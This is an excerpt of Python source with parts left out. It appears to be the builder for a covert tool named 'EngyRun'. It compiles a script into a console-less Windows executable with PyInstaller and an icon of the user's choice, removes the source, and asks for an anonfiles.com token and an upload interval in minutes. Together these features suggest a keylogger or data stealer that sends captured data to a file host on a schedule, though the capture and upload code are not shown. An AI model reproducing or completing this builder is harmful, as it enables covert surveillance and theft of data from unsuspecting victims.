...
class EngyRun:
    ...
    def CompilinG_icon(self):
        ...
        system(
            f"pyinstaller --onefile --noconsole --icon={self.icon} {self.filenampackeg}"
        )
        self.rem_ove()
    ...
    def packing(self):
        self.compiling = self.colored_input(
            X
            + f"{B}compiling {WI}({X}Py{WI}) {B}TO {WI}({X}ExE{WI}) {WI}({X}Y {WI}&& {R}N{WI}){WI}",
            spaces=8,
        )
    ...
    def packing_linux(self):
        self.compiling = self.colored_input(
            X
            + f"{B}compiling {WI}({X}Py{WI}) {B}file to {WI}({X}ExE{WI}) {WI}({X}Y {WI}&& {R}N{WI}){WI}",
            spaces=12,
        )
        if self.compiling == "y" or self.compiling == "Y":
            self.ico = self.colored_input(
    ...
    def choose(self, spaces0=3, spaces1=7):
        ...
        spaces1 = " " * spaces1
        try:
            self.token = self.colored_input(
                f"{BOOLD}{F}https://anonfiles.com{res}{bl}:{X}Token :", spaces=4
            )
            self.time_interval = self.colored_input(
                f"{BOOLD}{F}in minutes{res}{bl}:{X}Time :", spaces=4
            )
